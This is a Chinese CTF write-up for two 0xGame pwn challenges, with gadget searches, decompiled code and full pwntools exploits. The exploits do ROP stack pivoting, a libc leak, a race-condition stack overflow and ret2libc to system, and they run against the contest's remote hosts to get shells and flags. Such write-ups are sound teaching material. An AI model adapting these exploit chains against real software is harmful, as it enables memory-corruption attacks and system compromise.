[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret;

[INFO] File: pwn
0x000000000040123f: pop rdi; ret; 

                                                                                                     
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/跳一跳？]
└─$ ropper -f pwn --search "leave; ret;"  
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: leave; ret;

[INFO] File: pwn
0x00000000004011d8: leave; ret; 

                                                                                                     
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/跳一跳？]
└─$ ropper -f pwn --search "ret;"       
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret;

[INFO] File: pwn
0x000000000040101a: ret; 

                                                                                                     
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/跳一跳？]
└─$ objdump -R libc.so.6 | grep puts  
                                                                                                     
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/跳一跳？]
└─$ objdump -d libc.so.6 | grep puts
   7f237:       e8 74 1d 00 00          call   80fb0 <_IO_puts@@GLIBC_2.2.5+0x1a0>
000000000007f9c0 <_IO_fputs@@GLIBC_2.2.5>:
   7f9e3:       75 34                   jne    7fa19 <_IO_fputs@@GLIBC_2.2.5+0x59>
   7f9f9:       74 1a                   je     7fa15 <_IO_fputs@@GLIBC_2.2.5+0x55>
   7fa04:       0f 85 c6 00 00 00       jne    7fad0 <_IO_fputs@@GLIBC_2.2.5+0x110>
   7fa21:       75 5d                   jne    7fa80 <_IO_fputs@@GLIBC_2.2.5+0xc0>
   7fa4e:       76 70                   jbe    7fac0 <_IO_fputs@@GLIBC_2.2.5+0x100>
   7fa66:       75 1d                   jne    7fa85 <_IO_fputs@@GLIBC_2.2.5+0xc5>
   7fa6e:       74 23                   je     7fa93 <_IO_fputs@@GLIBC_2.2.5+0xd3>
   7fa83:       74 a8                   je     7fa2d <_IO_fputs@@GLIBC_2.2.5+0x6d>
   7fa91:       75 dd                   jne    7fa70 <_IO_fputs@@GLIBC_2.2.5+0xb0>
   7faa3:       75 cb                   jne    7fa70 <_IO_fputs@@GLIBC_2.2.5+0xb0>
   7fab2:       7e bc                   jle    7fa70 <_IO_fputs@@GLIBC_2.2.5+0xb0>
   7fab9:       eb b5                   jmp    7fa70 <_IO_fputs@@GLIBC_2.2.5+0xb0>
   7fac5:       eb 89                   jmp    7fa50 <_IO_fputs@@GLIBC_2.2.5+0x90>
   7fad5:       e9 30 ff ff ff          jmp    7fa0a <_IO_fputs@@GLIBC_2.2.5+0x4a>
   7fd56:       e8 55 12 00 00          call   80fb0 <_IO_puts@@GLIBC_2.2.5+0x1a0>
0000000000080e10 <_IO_puts@@GLIBC_2.2.5>:
   80e3e:       75 58                   jne    80e98 <_IO_puts@@GLIBC_2.2.5+0x88>
   80e54:       0f 84 ee 00 00 00       je     80f48 <_IO_puts@@GLIBC_2.2.5+0x138>
   80e64:       0f 85 26 01 00 00       jne    80f90 <_IO_puts@@GLIBC_2.2.5+0x180>
   80e86:       74 1d                   je     80ea5 <_IO_puts@@GLIBC_2.2.5+0x95>
   80e8b:       74 22                   je     80eaf <_IO_puts@@GLIBC_2.2.5+0x9f>
   80e92:       eb 76                   jmp    80f0a <_IO_puts@@GLIBC_2.2.5+0xfa>
   80ea3:       75 e3                   jne    80e88 <_IO_puts@@GLIBC_2.2.5+0x78>
   80ed0:       76 7e                   jbe    80f50 <_IO_puts@@GLIBC_2.2.5+0x140>
   80edf:       75 ac                   jne    80e8d <_IO_puts@@GLIBC_2.2.5+0x7d>
   80eed:       73 71                   jae    80f60 <_IO_puts@@GLIBC_2.2.5+0x150>
   80f11:       75 23                   jne    80f36 <_IO_puts@@GLIBC_2.2.5+0x126>
   80f25:       75 0f                   jne    80f36 <_IO_puts@@GLIBC_2.2.5+0x126>
   80f34:       7f 42                   jg     80f78 <_IO_puts@@GLIBC_2.2.5+0x168>
   80f4b:       e9 29 ff ff ff          jmp    80e79 <_IO_puts@@GLIBC_2.2.5+0x69>
   80f59:       e9 74 ff ff ff          jmp    80ed2 <_IO_puts@@GLIBC_2.2.5+0xc2>
   80f6d:       75 8b                   jne    80efa <_IO_puts@@GLIBC_2.2.5+0xea>
   80f6f:       e9 19 ff ff ff          jmp    80e8d <_IO_puts@@GLIBC_2.2.5+0x7d>
   80f85:       eb af                   jmp    80f36 <_IO_puts@@GLIBC_2.2.5+0x126>
   80f98:       e9 cd fe ff ff          jmp    80e6a <_IO_puts@@GLIBC_2.2.5+0x5a>
   80fb7:       0f 87 0b 01 00 00       ja     810c8 <_IO_puts@@GLIBC_2.2.5+0x2b8>
   80fce:       74 40                   je     81010 <_IO_puts@@GLIBC_2.2.5+0x200>
   80fd8:       78 76                   js     81050 <_IO_puts@@GLIBC_2.2.5+0x240>
   80fda:       74 34                   je     81010 <_IO_puts@@GLIBC_2.2.5+0x200>
   80fe8:       74 26                   je     81010 <_IO_puts@@GLIBC_2.2.5+0x200>
   80fed:       0f 84 a5 00 00 00       je     81098 <_IO_puts@@GLIBC_2.2.5+0x288>
   81031:       76 45                   jbe    81078 <_IO_puts@@GLIBC_2.2.5+0x268>
   81055:       74 b9                   je     81010 <_IO_puts@@GLIBC_2.2.5+0x200>
   8105a:       74 54                   je     810b0 <_IO_puts@@GLIBC_2.2.5+0x2a0>
   81073:       eb 9b                   jmp    81010 <_IO_puts@@GLIBC_2.2.5+0x200>
   8108f:       eb a2                   jmp    81033 <_IO_puts@@GLIBC_2.2.5+0x223>
   8109e:       0f 84 4f ff ff ff       je     80ff3 <_IO_puts@@GLIBC_2.2.5+0x1e3>
   810b6:       74 a4                   je     8105c <_IO_puts@@GLIBC_2.2.5+0x24c>
   810c3:       eb 97                   jmp    8105c <_IO_puts@@GLIBC_2.2.5+0x24c>
   878fe:       e8 ad 96 ff ff          call   80fb0 <_IO_puts@@GLIBC_2.2.5+0x1a0>
   87f32:       e8 79 90 ff ff          call   80fb0 <_IO_puts@@GLIBC_2.2.5+0x1a0>
   88c8e:       e8 1d 83 ff ff          call   80fb0 <_IO_puts@@GLIBC_2.2.5+0x1a0>
   88d66:       e8 45 82 ff ff          call   80fb0 <_IO_puts@@GLIBC_2.2.5+0x1a0>
000000000008a350 <fputs_unlocked@@GLIBC_2.2.5>:
   8a374:       75 5a                   jne    8a3d0 <fputs_unlocked@@GLIBC_2.2.5+0x80>
   8a3a1:       76 45                   jbe    8a3e8 <fputs_unlocked@@GLIBC_2.2.5+0x98>
   8a3bb:       75 18                   jne    8a3d5 <fputs_unlocked@@GLIBC_2.2.5+0x85>
   8a3d3:       74 ab                   je     8a380 <fputs_unlocked@@GLIBC_2.2.5+0x30>
   8a3ed:       eb b4                   jmp    8a3a3 <fputs_unlocked@@GLIBC_2.2.5+0x53>
   a1534:       e8 87 e4 fd ff          call   7f9c0 <_IO_fputs@@GLIBC_2.2.5>
   a1626:       e8 95 e3 fd ff          call   7f9c0 <_IO_fputs@@GLIBC_2.2.5>
   a73bf:       e8 fc 85 fd ff          call   7f9c0 <_IO_fputs@@GLIBC_2.2.5>
  11df8e:       e8 bd c3 f6 ff          call   8a350 <fputs_unlocked@@GLIBC_2.2.5>
000000000012b490 <putspent@@GLIBC_2.2.5>:
  12b4a7:       0f 84 63 04 00 00       je     12b910 <putspent@@GLIBC_2.2.5+0x480>
  12b4b7:       0f 84 53 04 00 00       je     12b910 <putspent@@GLIBC_2.2.5+0x480>
  12b4c8:       0f 84 42 04 00 00       je     12b910 <putspent@@GLIBC_2.2.5+0x480>
  12b4d5:       75 34                   jne    12b50b <putspent@@GLIBC_2.2.5+0x7b>
  12b4eb:       74 1a                   je     12b507 <putspent@@GLIBC_2.2.5+0x77>
  12b4f6:       0f 85 34 04 00 00       jne    12b930 <putspent@@GLIBC_2.2.5+0x4a0>
  12b543:       0f 85 5f 01 00 00       jne    12b6a8 <putspent@@GLIBC_2.2.5+0x218>
  12b551:       0f 83 79 02 00 00       jae    12b7d0 <putspent@@GLIBC_2.2.5+0x340>
  12b56a:       0f 85 6a 01 00 00       jne    12b6da <putspent@@GLIBC_2.2.5+0x24a>
  12b578:       0f 83 b2 02 00 00       jae    12b830 <putspent@@GLIBC_2.2.5+0x3a0>
  12b591:       0f 85 75 01 00 00       jne    12b70c <putspent@@GLIBC_2.2.5+0x27c>
  12b59f:       0f 83 5b 02 00 00       jae    12b800 <putspent@@GLIBC_2.2.5+0x370>
  12b5b8:       0f 85 80 01 00 00       jne    12b73e <putspent@@GLIBC_2.2.5+0x2ae>
  12b5c6:       0f 83 94 02 00 00       jae    12b860 <putspent@@GLIBC_2.2.5+0x3d0>
  12b5df:       0f 85 8b 01 00 00       jne    12b770 <putspent@@GLIBC_2.2.5+0x2e0>
  12b5ed:       0f 83 cd 02 00 00       jae    12b8c0 <putspent@@GLIBC_2.2.5+0x430>
  12b606:       0f 85 96 01 00 00       jne    12b7a2 <putspent@@GLIBC_2.2.5+0x312>
  12b614:       0f 83 76 02 00 00       jae    12b890 <putspent@@GLIBC_2.2.5+0x400>
  12b62d:       74 1a                   je     12b649 <putspent@@GLIBC_2.2.5+0x1b9>
  12b651:       0f 83 99 02 00 00       jae    12b8f0 <putspent@@GLIBC_2.2.5+0x460>
  12b66d:       75 27                   jne    12b696 <putspent@@GLIBC_2.2.5+0x206>
  12b681:       75 13                   jne    12b696 <putspent@@GLIBC_2.2.5+0x206>
  12b690:       0f 8f aa 02 00 00       jg     12b940 <putspent@@GLIBC_2.2.5+0x4b0>
  12b6bb:       0f 88 2f 01 00 00       js     12b7f0 <putspent@@GLIBC_2.2.5+0x360>
  12b6c6:       0f 84 7d fe ff ff       je     12b549 <putspent@@GLIBC_2.2.5+0xb9>
  12b6d4:       0f 84 96 fe ff ff       je     12b570 <putspent@@GLIBC_2.2.5+0xe0>
  12b6ed:       0f 88 5d 01 00 00       js     12b850 <putspent@@GLIBC_2.2.5+0x3c0>
  12b6f8:       0f 84 72 fe ff ff       je     12b570 <putspent@@GLIBC_2.2.5+0xe0>
  12b706:       0f 84 8b fe ff ff       je     12b597 <putspent@@GLIBC_2.2.5+0x107>
  12b71f:       0f 88 fb 00 00 00       js     12b820 <putspent@@GLIBC_2.2.5+0x390>
  12b72a:       0f 84 67 fe ff ff       je     12b597 <putspent@@GLIBC_2.2.5+0x107>
  12b738:       0f 84 80 fe ff ff       je     12b5be <putspent@@GLIBC_2.2.5+0x12e>
  12b751:       0f 88 29 01 00 00       js     12b880 <putspent@@GLIBC_2.2.5+0x3f0>
  12b75c:       0f 84 5c fe ff ff       je     12b5be <putspent@@GLIBC_2.2.5+0x12e>
  12b76a:       0f 84 75 fe ff ff       je     12b5e5 <putspent@@GLIBC_2.2.5+0x155>
  12b783:       0f 88 57 01 00 00       js     12b8e0 <putspent@@GLIBC_2.2.5+0x450>
  12b78e:       0f 84 51 fe ff ff       je     12b5e5 <putspent@@GLIBC_2.2.5+0x155>
  12b79c:       0f 84 6a fe ff ff       je     12b60c <putspent@@GLIBC_2.2.5+0x17c>
  12b7b5:       0f 88 f5 00 00 00       js     12b8b0 <putspent@@GLIBC_2.2.5+0x420>
  12b7c0:       0f 85 5f fe ff ff       jne    12b625 <putspent@@GLIBC_2.2.5+0x195>
  12b7c6:       e9 41 fe ff ff          jmp    12b60c <putspent@@GLIBC_2.2.5+0x17c>
  12b7e0:       0f 85 7c fd ff ff       jne    12b562 <putspent@@GLIBC_2.2.5+0xd2>
  12b7f4:       e9 69 fd ff ff          jmp    12b562 <putspent@@GLIBC_2.2.5+0xd2>
  12b810:       0f 85 9a fd ff ff       jne    12b5b0 <putspent@@GLIBC_2.2.5+0x120>
  12b824:       e9 87 fd ff ff          jmp    12b5b0 <putspent@@GLIBC_2.2.5+0x120>
  12b840:       0f 85 43 fd ff ff       jne    12b589 <putspent@@GLIBC_2.2.5+0xf9>
  12b854:       e9 30 fd ff ff          jmp    12b589 <putspent@@GLIBC_2.2.5+0xf9>
  12b870:       0f 85 61 fd ff ff       jne    12b5d7 <putspent@@GLIBC_2.2.5+0x147>
  12b884:       e9 4e fd ff ff          jmp    12b5d7 <putspent@@GLIBC_2.2.5+0x147>
  12b8a0:       0f 85 7f fd ff ff       jne    12b625 <putspent@@GLIBC_2.2.5+0x195>
  12b8b4:       e9 6c fd ff ff          jmp    12b625 <putspent@@GLIBC_2.2.5+0x195>
  12b8d0:       0f 85 28 fd ff ff       jne    12b5fe <putspent@@GLIBC_2.2.5+0x16e>
  12b8e4:       e9 15 fd ff ff          jmp    12b5fe <putspent@@GLIBC_2.2.5+0x16e>
  12b900:       0f 85 5c fd ff ff       jne    12b662 <putspent@@GLIBC_2.2.5+0x1d2>
  12b906:       e9 5c fd ff ff          jmp    12b667 <putspent@@GLIBC_2.2.5+0x1d7>
  12b923:       e9 6e fd ff ff          jmp    12b696 <putspent@@GLIBC_2.2.5+0x206>
  12b935:       e9 c2 fb ff ff          jmp    12b4fc <putspent@@GLIBC_2.2.5+0x6c>
  12b94d:       e9 44 fd ff ff          jmp    12b696 <putspent@@GLIBC_2.2.5+0x206>
000000000012cb60 <putsgent@@GLIBC_2.10>:
  12cb7b:       0f 84 3f 02 00 00       je     12cdc0 <putsgent@@GLIBC_2.10+0x260>
  12cb8b:       0f 84 2f 02 00 00       je     12cdc0 <putsgent@@GLIBC_2.10+0x260>
  12cb9c:       0f 84 1e 02 00 00       je     12cdc0 <putsgent@@GLIBC_2.10+0x260>
  12cbad:       0f 84 0d 02 00 00       je     12cdc0 <putsgent@@GLIBC_2.10+0x260>
  12cbc1:       0f 84 f9 01 00 00       je     12cdc0 <putsgent@@GLIBC_2.10+0x260>
  12cbce:       0f 84 4c 01 00 00       je     12cd20 <putsgent@@GLIBC_2.10+0x1c0>
  12cc17:       75 30                   jne    12cc49 <putsgent@@GLIBC_2.10+0xe9>
  12cc19:       eb 36                   jmp    12cc51 <putsgent@@GLIBC_2.10+0xf1>
  12cc29:       75 07                   jne    12cc32 <putsgent@@GLIBC_2.10+0xd2>
  12cc41:       0f 88 29 01 00 00       js     12cd70 <putsgent@@GLIBC_2.10+0x210>
  12cc4f:       75 cf                   jne    12cc20 <putsgent@@GLIBC_2.10+0xc0>
  12cc59:       0f 83 41 01 00 00       jae    12cda0 <putsgent@@GLIBC_2.10+0x240>
  12cc86:       75 2f                   jne    12ccb7 <putsgent@@GLIBC_2.10+0x157>
  12cc88:       eb 36                   jmp    12ccc0 <putsgent@@GLIBC_2.10+0x160>
  12cc9a:       75 03                   jne    12cc9f <putsgent@@GLIBC_2.10+0x13f>
  12ccae:       0f 88 ac 00 00 00       js     12cd60 <putsgent@@GLIBC_2.10+0x200>
  12ccbe:       75 d0                   jne    12cc90 <putsgent@@GLIBC_2.10+0x130>
  12ccc8:       0f 83 b2 00 00 00       jae    12cd80 <putsgent@@GLIBC_2.10+0x220>
  12cce7:       75 27                   jne    12cd10 <putsgent@@GLIBC_2.10+0x1b0>
  12ccfb:       75 13                   jne    12cd10 <putsgent@@GLIBC_2.10+0x1b0>
  12cd0a:       0f 8f c8 00 00 00       jg     12cdd8 <putsgent@@GLIBC_2.10+0x278>
  12cd34:       74 1a                   je     12cd50 <putsgent@@GLIBC_2.10+0x1f0>
  12cd3f:       0f 85 a5 00 00 00       jne    12cdea <putsgent@@GLIBC_2.10+0x28a>
  12cd54:       e9 7b fe ff ff          jmp    12cbd4 <putsgent@@GLIBC_2.10+0x74>
  12cd65:       e9 56 ff ff ff          jmp    12ccc0 <putsgent@@GLIBC_2.10+0x160>
  12cd7b:       e9 d1 fe ff ff          jmp    12cc51 <putsgent@@GLIBC_2.10+0xf1>
  12cd90:       0f 85 43 ff ff ff       jne    12ccd9 <putsgent@@GLIBC_2.10+0x179>
  12cd96:       e9 46 ff ff ff          jmp    12cce1 <putsgent@@GLIBC_2.10+0x181>
  12cdba:       e9 ab fe ff ff          jmp    12cc6a <putsgent@@GLIBC_2.10+0x10a>
  12cdd3:       e9 38 ff ff ff          jmp    12cd10 <putsgent@@GLIBC_2.10+0x1b0>
  12cde5:       e9 26 ff ff ff          jmp    12cd10 <putsgent@@GLIBC_2.10+0x1b0>
  12cdef:       e9 51 ff ff ff          jmp    12cd45 <putsgent@@GLIBC_2.10+0x1e5>
                                                                                                     
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/跳一跳？]
└─$ objdump -d pwn | grep puts      
0000000000401040 <puts@plt>:
  401040:       ff 25 da 2f 00 00       jmp    *0x2fda(%rip)        # 404020 <puts@GLIBC_2.2.5>
  401256:       e8 e5 fd ff ff          call   401040 <puts@plt>
  40127e:       e8 bd fd ff ff          call   401040 <puts@plt>
  4012b4:       e8 87 fd ff ff          call   401040 <puts@plt>
  4012cd:       e8 6e fd ff ff          call   401040 <puts@plt>
                                                                                                     
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/跳一跳？]
└─$ objdump -R pwn | grep puts
0000000000404020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
                                                                                                     
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/跳一跳？]
└─$ readelf -s libc.so.6 | grep system
  1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
                                                                                                     
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/跳一跳？]
└─$ strings -a -t x libc.so.6 | grep "/bin/sh"
 1d8678 /bin/sh
```

```assembly
.bss:00000000004047A0                 public global_buf
.bss:00000000004047A0 global_buf      db    ? ;
```

##### 4. 编写脚本

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("nc1.ctfplus.cn", 47678)
# r = process(["./pwn"])

# gdb.attach(r, "b *0x401294")

pop_rdi_ret_elf_addr = 0x40123f
pop_rbp_ret_elf_addr = 0x40113d
ret_elf_addr = 0x40101a
leave_ret_elf_addr = 0x4011d8

puts_got_elf_addr = 0x404020

puts_plt_elf_addr = 0x401040

main_elf_addr = 0x40129C
vuln_elf_addr = 0x401244

buf_elf_addr = 0x4047A0

# leak libc

payload = p64(pop_rdi_ret_elf_addr) + p64(puts_got_elf_addr) + p64(puts_plt_elf_addr) + p64(pop_rbp_ret_elf_addr) + p64(0x4011d9 - 0x8 * 3) + p64(vuln_elf_addr)
payload += b'\x00' * (512 - 0x8 * 6)
r.sendafter(b"house:", payload)

payload = b'b'*0x10
payload += p64(buf_elf_addr - 0x8) + p64(leave_ret_elf_addr)
payload += b'\x00' * (32 - 0x10 - 0x8 * 2)
r.sendafter(b"pivot:", payload)

puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode(), drop=False)[-6:].ljust(8, '\x00'.encode()))
print("puts_got_libc_addr", hex(puts_got_libc_addr))

puts_got_libc_offset = 0x80e10
libc_base_libc_addr = puts_got_libc_addr - puts_got_libc_offset
print("libc_base_libc_addr", hex(libc_base_libc_addr))

# ret2libc

time.sleep(2)

bin_sh_libc_offset = 0x1d8678
bin_sh_libc_addr = libc_base_libc_addr + bin_sh_libc_offset

system_libc_offset = 0x50d70
system_libc_addr = libc_base_libc_addr + system_libc_offset

payload = p64(0xdeadbeef) + p64(0xdeadbeef) + p64(pop_rdi_ret_elf_addr) + p64(bin_sh_libc_addr) + p64(system_libc_addr) # 为什么前面两个是0xdeadbeef这个是调试出来的，发现它会在这里直接栈溢出执行rop，这里不用ret
payload += b'\x00' * (512 - 0x8 * 5)
r.sendafter(b"house:", payload)

r.interactive()
r.close()
```

**分析**

- pwndbg再次夺得了MVP!

```shell
puts_got_libc_addr 0x7fd31616ce10
libc_base_libc_addr 0x7fd3160ec000
[*] Switching to interactive mode

$ ls
flag
ld-linux-x86-64.so.2
libc.so.6
pwn
$ cat flag
0xGame{54641d07-b256-4573-a3c8-5c3b9e2b4176}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{54641d07-b256-4573-a3c8-5c3b9e2b4176}
```



### 白驹过隙

#### 题目介绍

> 作者 x1z1 
>
> 21 队已解出本题
>
> # 白驹过隙
>
> - 773分
> - Pwn
> - 动态环境
> - 中等
>
> 你碰到了一台十分奇怪的机器。
>
> 呆呆的，连说话的长度和内容都要问你
>
> 可是，好像时好时坏的
>
> 但是千万记住，它好的时候，千万不要说太长的话
>
> 千万不要......

---

#### 解题过程

##### 1. 信息搜集

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/白驹过隙/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

##### 2. 查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  pthread_t newthread; // [rsp+0h] [rbp-10h] BYREF
  int v5; // [rsp+Ch] [rbp-4h]

  init_io(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts(asc_402098);
        puts("1. Set global message");
        puts("2. Set copy length");
        puts("3. Async trigger copy");
        puts("4. Exit");
        printf("Choice: ");
        v5 = read_int();
        if ( v5 != 1 )
          break;
        printf("Message (max 200 bytes): ");
        read(0, &global_msg, 0xC8u);
      }
      if ( v5 != 2 )
        break;
      printf("Length: ");
      copy_length = read_int();
      printf("Length set to %d\n", copy_length);
    }
    if ( v5 != 3 )
      break;
    pthread_create(&newthread, 0, async_copy, 0);
    pthread_detach(newthread);
  }
  return 0;
}
```

```c
int read_int()
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  read(0, buf, 0xFu);
  return atoi(buf);
}
```

```c
void *__fastcall async_copy(void *a1)
{
  _BYTE dest[32]; // [rsp+10h] [rbp-20h] BYREF

  if ( copy_length > 32 )
  {
    puts("[Thread] Error: Length too large! Abort.");
  }
  else
  {
    puts("[Thread] Length check passed! Preparing to copy...");
    usleep(0x7A120u);
    memcpy(dest, &global_msg, copy_length);
    puts("[Thread] Copy done! Exiting thread...");
  }
  return 0;
}
```

**分析**

- 我在这里真的真的真的要狠狠地狠狠地狠狠地吐槽一下这道题！！！
- 这道题我做了至少六个多小时！
- exp执行了至少上千次！
- 这道题的远程极不稳定而且和本地略有差异，我也是摸着黑一点点纯手搓调试出来的！
- 先说一下解法：竞争usleep窗口修改`copy_length`实现栈溢出，先leak出libc_base然后ret回main最后ret2libc
- 再说一下坑点：这道题不能用负数的`copy_length`不然会爆内存；然后因为read_int和main_end里都有`leave; ret;`我们第一次`leak`的时候会覆盖`rbp`再走这些函数会触发`栈迁移`但这里不适合执行`rop`因为不论是`system`还是`one_gadget`在这个`rsp`都不合适，只要是因为mov rsp, rbp - 0x388然后操作这个[rsp-0x18] -> 0会段错误；所以我们还是得栈溢出，但是我们要巧用`ret`去修正这个`rbp`不然还是执行不了`system`；同时注意对齐`addr % 16 == 0`；同时这里不能用`system("/bin/sh\x00")`因为这是在子线程里执行的要完整实行完`return`回主线程后才会`getshell`，所以我们要自己构造`ls`、`ls /`、`system("cat flag")`
- 最后继续我的吐槽：这里居然用了三个`while (1)`这么反人类的逻辑我真的哭死，这导致了什么呢？导致了ret回main的时候顺序有机率出现混乱输入`1`不会被读取执行而是存入缓存，再输入`2`有机率被执行同时弹出缓存从而实现输入`1、2`执行`2、1`的诡异现象，还有可能是达到的`while`层不确定从而输入无效，还会无缘无故崩溃，第二次竞争窗口的失败率也极高
- 算了先不说了，浪费时间

##### 3. 数据搜集

```assembly
.bss:00000000004040C0                 public global_msg
.bss:00000000004040C0 global_msg      db    ? ;

.text:0000000000401352                 public main
.text:0000000000401352 main            proc near               ; DATA XREF: _start+18↑o
.text:0000000000401352
.text:0000000000401352 newthread       = qword ptr -10h
.text:0000000000401352 var_4           = dword ptr -4
.text:0000000000401352
.text:0000000000401352 ; __unwind {
.text:0000000000401352                 endbr64
.text:0000000000401356                 push    rbp
.text:0000000000401357                 mov     rbp, rsp
.text:000000000040135A                 sub     rsp, 10h
.text:000000000040135E                 mov     eax, 0
.text:0000000000401363                 call    init_io
.text:0000000000401368
.text:0000000000401368 loc_401368:
```

```assembly
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/白驹过隙]
└─$ objdump -d pwn | grep puts                  
00000000004010c0 <puts@plt>:
  4010c4:       f2 ff 25 4d 2f 00 00    bnd jmp *0x2f4d(%rip)        # 404018 <puts@GLIBC_2.2.5>
  4012fd:       e8 be fd ff ff          call   4010c0 <puts@plt>
  401335:       e8 86 fd ff ff          call   4010c0 <puts@plt>
  401346:       e8 75 fd ff ff          call   4010c0 <puts@plt>
  401372:       e8 49 fd ff ff          call   4010c0 <puts@plt>
  401381:       e8 3a fd ff ff          call   4010c0 <puts@plt>
  401390:       e8 2b fd ff ff          call   4010c0 <puts@plt>
  40139f:       e8 1c fd ff ff          call   4010c0 <puts@plt>
  4013ae:       e8 0d fd ff ff          call   4010c0 <puts@plt>
                                                                                    
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/白驹过隙]
└─$ objdump -R pwn | grep puts
0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
                                                                                    
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/白驹过隙]
└─$ objdump -d libc.so.6 | grep puts
0000000000080e50 <_IO_puts@@GLIBC_2.2.5>:
   80e7e:       75 58                   jne    80ed8 <_IO_puts@@GLIBC_2.2.5+0x88>
   80e94:       0f 84 ee 00 00 00       je     80f88 <_IO_puts@@GLIBC_2.2.5+0x138>
   80ea4:       0f 85 26 01 00 00       jne    80fd0 <_IO_puts@@GLIBC_2.2.5+0x180>
```

##### 4. 编写脚本

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
context.log_level = "debug"

r = remote("nc1.ctfplus.cn", 27238)
# r = process(["./pwn"])

elf = ELF("./pwn")
rop = ROP([elf])

# gdb.attach(r, """b *0x401326""")

pop_rdi_ret_elf_addr = rop.find_gadget(["pop rdi", "ret"])[0]
ret_elf_addr = rop.find_gadget(["ret"])[0]

puts_got_elf_addr = 0x404018
puts_plt_elf_addr = 0x4010c0

main_elf_addr = 0x401352

rbp_elf_addr = 0x4040C0

# leak2libc

payload = str(1).encode()
r.sendlineafter(b"Choice: ", payload)

payload = cyclic(0x20)
payload += p64(rbp_elf_addr)
payload += p64(ret_elf_addr) + p64(pop_rdi_ret_elf_addr) + p64(puts_got_elf_addr) + p64(puts_plt_elf_addr) + p64(ret_elf_addr) + p64(main_elf_addr)
r.sendafter(b"Message (max 200 bytes): ", payload)

time.sleep(2)

payload = str(2).encode()
r.sendlineafter(b"Choice: ", payload)

payload = str(0).encode()
r.sendlineafter(b"Length: ", payload)

time.sleep(2)

payload = str(3).encode()
r.sendlineafter(b"Choice: ", payload)

payload = str(2).encode()
r.sendlineafter(b"copy...", payload)

payload = str(0x100).encode()
r.sendline(payload)

puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode(), drop=False)[-6:].ljust(8, '\x00'.encode()))
print("puts_got_libc_addr", hex(puts_got_libc_addr))

puts_got_libc_offset = 0x80e50
libc_base_libc_addr = puts_got_libc_addr - puts_got_libc_offset
print("libc_base_libc_addr", hex(libc_base_libc_addr))

pop_rsp_ret_libc_offset = 0x35732
pop_rsp_ret_libc_addr = libc_base_libc_addr + pop_rsp_ret_libc_offset

bin_sh_libc_offset = 0x1d8678
bin_sh_libc_addr = libc_base_libc_addr + bin_sh_libc_offset

system_libc_offset = 0x50d70
system_libc_addr = libc_base_libc_addr + system_libc_offset

one_gadget_libc_offset = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]
one_gadget_libc_addr = [libc_base_libc_addr + offset for offset in one_gadget_libc_offset]

# ret2libc

time.sleep(2)

payload = str(1).encode()
r.sendlineafter(b"Choice: ", payload)

time.sleep(2)

payload = cyclic(0x20)
payload += p64(rbp_elf_addr)
payload += p64(pop_rdi_ret_elf_addr) + p64(0x4040C0 + 0x20 + 0x8 + 0x8 * 4) + p64(ret_elf_addr) + p64(system_libc_addr) + b"cat flag\00\00"
r.sendafter(b"Message (max 200 bytes): ", payload)

time.sleep(2)

payload = str(2).encode()
r.sendlineafter(b"Choice: ", payload)

time.sleep(2)

payload = str(0).encode()
r.sendlineafter(b"Length: ", payload)

time.sleep(2)

payload = str(3).encode()
r.sendlineafter(b"Choice: ", payload)

payload = str(2).encode()
r.sendlineafter(b"copy...", payload)

payload = str(0x100).encode()
r.sendline(payload)

r.interactive()
r.close()
```

```shell
Length set to 256

--- 异步复读机 (Hardcore Ver) ---
1. Set global message
2. Set copy length
3. Async trigger copy
4. Exit
Choice: [DEBUG] Received 0x26 bytes:
    b'[Thread] Copy done! Exiting thread...\n'
[Thread] Copy done! Exiting thread...
[DEBUG] Received 0x2d bytes:
    b'0xGame{017f1b64-c177-4efb-a4bb-9b5b47a34b73}\n'
0xGame{017f1b64-c177-4efb-a4bb-9b5b47a34b73}
[*] Got EOF while reading in interactive
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{017f1b64-c177-4efb-a4bb-9b5b47a34b73}
```



# 队伍

## 名称

**暂无**



## 口号

**暂无**



## 成员

### 队长

- **probie**

### 队员

- **暂无**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / ?**

### 解题

- **0 / ?**

### 分数

- **0 / ?**